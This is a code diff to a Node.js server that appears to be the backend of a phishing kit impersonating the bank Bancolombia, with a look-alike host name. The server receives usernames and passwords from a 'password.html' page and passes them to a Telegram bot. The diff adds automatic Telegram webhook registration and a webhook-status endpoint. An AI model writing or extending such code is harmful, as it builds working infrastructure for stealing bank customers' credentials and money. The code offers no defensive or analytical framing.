@@ -56,6 +56,37 @@ function generateSessionId() {
     return Date.now().toString(36) + Math.random().toString(36).substr(2);
 }
 
+// Función para configurar el webhook de Telegram
+async function setupTelegramWebhook() {
+    try {
+        // Tu URL pública del servidor
+        const WEBHOOK_URL = `https://bancolombiacom-tiyt.onrender.com/webhook/${TELEGRAM_BOT_TOKEN}`;
+        
+        const response = await fetch(`${TELEGRAM_API_URL}/setWebhook`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                url: WEBHOOK_URL
+            })
+        });
+
+        const result = await response.json();
+        
+        if (result.ok) {
+            console.log('✅ Webhook configurado correctamente:', WEBHOOK_URL);
+        } else {
+            console.error('❌ Error configurando webhook:', result);
+        }
+        
+        return result;
+    } catch (error) {
+        console.error('❌ Error configurando webhook:', error);
+        return null;
+    }
+}
+
 // API Endpoints
 
 // 1. Enviar datos de usuario y clave (desde password.html)
@@ -284,6 +315,17 @@ app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, (req, res) => {
     }
 });
 
+// Verificar estado del webhook
+app.get('/api/webhook-info', async (req, res) => {
+    try {
+        const response = await fetch(`${TELEGRAM_API_URL}/getWebhookInfo`);
+        const result = await response.json();
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
 // Servir archivos estáticos
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
@@ -309,10 +351,13 @@ setInterval(() => {
     }
 }, 60 * 60 * 1000);
 
-app.listen(PORT, () => {
+app.listen(PORT, async () => {
     console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
     console.log(`📱 Bot de Telegram configurado`);
     console.log(`🌐 Webhook: /webhook/${TELEGRAM_BOT_TOKEN}`);
+    
+    // Configurar webhook automáticamente
+    await setupTelegramWebhook();
 });
 
 module.exports = app;
